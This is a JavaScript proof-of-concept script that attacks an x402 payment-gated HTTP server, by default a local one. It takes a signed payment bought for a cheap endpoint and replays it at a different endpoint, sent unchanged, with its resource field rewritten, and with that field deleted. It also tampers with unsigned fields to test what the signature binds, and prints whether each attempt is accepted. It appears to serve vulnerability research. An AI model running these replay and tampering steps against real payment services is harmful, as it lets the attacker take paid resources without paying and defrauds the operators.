import { x402HTTPClient } from "@x402/core/http";
import { x402Client } from "@x402/core/client";
import { ExactEvmScheme } from "@x402/evm/exact/client";
import { privateKeyToAccount } from "viem/accounts";
import { POC_PRIVATE_KEY } from "./key.mjs";

const SRV = process.env.SERVER || "http://127.0.0.1:4198";
const account = privateKeyToAccount(POC_PRIVATE_KEY);
const client = new x402Client(); client.register("eip155:*", new ExactEvmScheme(account));
const hc = new x402HTTPClient(client);

async function freshPayloadFor(path) {
  const c = await fetch(`${SRV}${path}`);
  const body = await c.json();
  const pr = hc.getPaymentRequiredResponse(n => c.headers.get(n), body);
  const payload = await hc.createPaymentPayload(pr);
  return { pr, payload, headers: hc.encodePaymentSignatureHeader(payload) };
}

console.log("A) payload bought for /api/cheap, untouched, sent to /api/twin");
{
  const { payload, headers } = await freshPayloadFor("/api/cheap");
  console.log(`   payload.resource.url = ${payload.resource?.url}`);
  const r = await fetch(`${SRV}/api/twin`, { headers });
  console.log(`   -> HTTP ${r.status} ${r.status === 200 ? "ACCEPTED" : "rejected"}   body=${(await r.text()).slice(0,60)}`);
}

console.log("\nB) same payment, resource field REWRITTEN by the attacker to /api/twin");
{
  const { payload } = await freshPayloadFor("/api/cheap");
  payload.resource = { url: `${SRV}/api/twin`, description: "twin resource", mimeType: "" };
  const headers = hc.encodePaymentSignatureHeader(payload);
  const r = await fetch(`${SRV}/api/twin`, { headers });
  console.log(`   -> HTTP ${r.status} ${r.status === 200 ? "ACCEPTED" : "rejected"}   body=${(await r.text()).slice(0,60)}`);
}

console.log("\nC) same payment, resource field DELETED entirely, sent to /api/twin");
{
  const { payload } = await freshPayloadFor("/api/cheap");
  delete payload.resource;
  const headers = hc.encodePaymentSignatureHeader(payload);
  const r = await fetch(`${SRV}/api/twin`, { headers });
  console.log(`   -> HTTP ${r.status} ${r.status === 200 ? "ACCEPTED" : "rejected"}   body=${(await r.text()).slice(0,60)}`);
}

console.log("\nD) is `resource` inside the signature? tamper description of a payload for /api/cheap then spend at /api/cheap");
{
  const { payload } = await freshPayloadFor("/api/cheap");
  payload.resource.description = "I AM A LIE";
  payload.accepted.extra = { ...payload.accepted.extra, note: "tampered" };
  const headers = hc.encodePaymentSignatureHeader(payload);
  const r = await fetch(`${SRV}/api/cheap`, { headers });
  console.log(`   tampered accepted.extra -> HTTP ${r.status} ${r.status === 200 ? "ACCEPTED (extra is not signature-bound)" : "rejected"}`);
}
